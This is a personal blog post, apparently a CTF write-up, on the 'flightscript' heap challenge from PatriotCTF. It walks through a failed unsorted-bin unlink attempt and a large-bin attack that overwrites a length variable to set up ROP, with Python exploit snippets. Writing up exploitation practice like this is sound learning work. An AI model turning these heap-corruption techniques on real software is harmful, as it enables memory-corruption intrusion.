<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>flightscript | papichulo16</title>
  <link rel="stylesheet" href="/assets/css/style.css">
  
</head>
<body>
  <nav class="navbar">
    <a class="menu home-link" href="/"><img src="/assets/img/chavo.png" alt="El chavo" class="pfp-img">papichulo16</a>

    <div class="nav-right">
      <a href="https://github.com/papichulo16">Github</a>
      <a href="/contact">Contact</a>
      <a href="/reviews">Reviews</a>
      <div class="dropdown">
        <span><a href="/projects">Projects ▾</a></span>
        <div class="dropdown-content">
          
            <a href="/projects/1_magical_kernel.html">Magical Kernel</a>
          
            <a href="/projects/2_crap.html">C.R.A.P</a>
          
            <a href="/projects/6_ctf_writeups.html">PWN Writeups (blogs)</a>
          
        </div>
      </div>
    </div>
  </nav>
  <hr>

  <main>
    <article class="blog-post">
  <h1>flightscript</h1>
  <p class="post-date">September 23, 2024</p>

  <div class="post-content">
    <p><a href="https://github.com/papichulo16/ctf-stuff/blob/main/PatriotCTF/flightstuff/">source</a></p>

<p>This challenge was my first ever heap challenge on a live CTF. I did HeapLab 1 and 2 and I figured that it wouldn’t be crazy compared to the challenges inside those courses.</p>

<p>Anyways the whole challenge is just the fact that you are only allowed 8 active chunks at a time but if you free one you open another spot in the chunk pointers array (aka scripts in the binary). Not just that, but we had no way of viewing chunks so that means no leaks. Also the weirdest part, in my opinion, was that the only data we could write was the 0x18 bytes after the chunk pointer, and only 8 bytes. So I found that if we create a 0x20 sized chunk then we can overwrite the next chunk’s size field.</p>

<p>Now the attack angle that <a href="https://github.com/Dylan-Jessee">we</a> thought of was to set chunks to the unsorted bins, and then unlink an address to the chunk pointers array so we can overwrite data to wherever with the edit function. Then try to overwrite the <code class="language-plaintext highlighter-rouge">loglen</code> buffer so we can ROP. The only roadblock stopping us will have to be how do we get to write into a chunk’s bk pointer.</p>

<p>The way that I thought of was to first create a 0x20 sized chunk for the overwriting of a size field, and then two large sized chunks so that way they don’t go to the tcache bins. Next change the size field of the upper large chunk to overlap both and then free it. Next create a chunk that is 0x10 size smaller than the original upper large chunk and then another chunk to make it overlap both original chunks. This will get us to write to the bk pointer.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># create initial chunks
</span><span class="n">create</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x20d71</span><span class="p">))</span> <span class="c1"># 0
</span><span class="n">create</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x438</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span> <span class="c1"># 1 a
</span><span class="n">create</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x418</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span> <span class="c1"># 2 (target chunk)
</span><span class="n">create</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span> <span class="c1"># 3
</span>
<span class="c1"># free to unsorted bins and change size
</span><span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x861</span><span class="p">))</span> <span class="c1"># a
</span><span class="n">delete</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

<span class="n">create</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x428</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span> <span class="c1"># 1 a
</span><span class="n">create</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"AAAA"</span><span class="p">)</span> <span class="c1"># 4
</span>   
<span class="c1"># this edits target chunk's bk
</span><span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">"AAAA"</span><span class="p">)</span>
</code></pre></div></div>

<p>Next theoretically we should be able to unlink to the chunk pointers since that array will hold the address of our target chunk. The only problem is that we got an error with a mismatching prev_size field. Luckily if we find out how to change the target chunk’s size field we can align it to this old prev_size later down in the heap. So same process again basically.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># change back target chunk's size field so it works
</span><span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x461</span><span class="p">))</span> <span class="c1"># a
#delete(io, 1)
</span><span class="n">create</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x418</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span> <span class="c1"># 5 a
</span><span class="n">delete</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">create</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x418</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span> <span class="c1"># 1 a
</span><span class="n">create</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x421</span><span class="p">))</span> <span class="c1"># 6
</span>
<span class="c1"># edit bk
</span><span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4040f0</span><span class="p">))</span>
<span class="c1">#edit(io, 5, p64(0x4040e0))
</span></code></pre></div></div>

<p>Now we have the main arena’s address in the <code class="language-plaintext highlighter-rouge">scripts</code> array, only problem is that we can’t malloc any more chunks because it will fail a size check. Also we can’t edit anything in the main arena because the edit function uses a completely different array called <code class="language-plaintext highlighter-rouge">savedTags</code> and we didn’t realize it until after we did all of this work. So only the <code class="language-plaintext highlighter-rouge">scripts</code> array is used when allocating a new chunk but after that it is it. Also we can’t unlink to the <code class="language-plaintext highlighter-rouge">savedTags</code> because it stores the chunk pointers + 0x18 so all of them end with an 8, which will make it all have a misalignment issue.</p>

<p>This is where we got stuck, after a bit I decided to go to bed since I had work the next day and we didn’t end up finishing this challenge once the CTF was over. After checking out the writeup, I found that we completely forgot that we could of done a large bins attack to overwrite the <code class="language-plaintext highlighter-rouge">loglen</code> variable and then we ROP. So basically we just took a lot of extra steps we did not need, sadly. This is all we had to do heap related to then get into a simple ROP.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># create initial chunks
</span><span class="n">create</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x428</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span> <span class="c1"># 0
</span><span class="n">create</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span> <span class="c1"># 1 this chunk stops consolidation
</span><span class="n">create</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x418</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span> <span class="c1"># 2
</span>
<span class="c1"># sort to the large bins
</span><span class="n">delete</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="n">create</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x438</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span> <span class="c1"># 3
</span>
<span class="c1"># large bins attack
</span><span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"loglen"</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">))</span>
<span class="n">delete</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
<span class="n">create</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x438</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span> <span class="c1"># 4
</span></code></pre></div></div>
<p>So tragic. Anyways I decided to solve it on my own with the knowledge of the large bins attack so if you want to see the rest of the ROP, the script will be in the directory.</p>


  </div>
</article>

<style>
.blog-post {
  max-width: 800px;
  margin: auto;
  padding: 20px;
}
.post-date {
  color: #777;
  font-size: 0.9rem;
  margin-bottom: 20px;
}
.post-content img {
  max-width: 100%;
}
</style>


  </main>

  <footer>
    <hr>
    © 2025 papichulo16
  </footer>
</body>
</html>

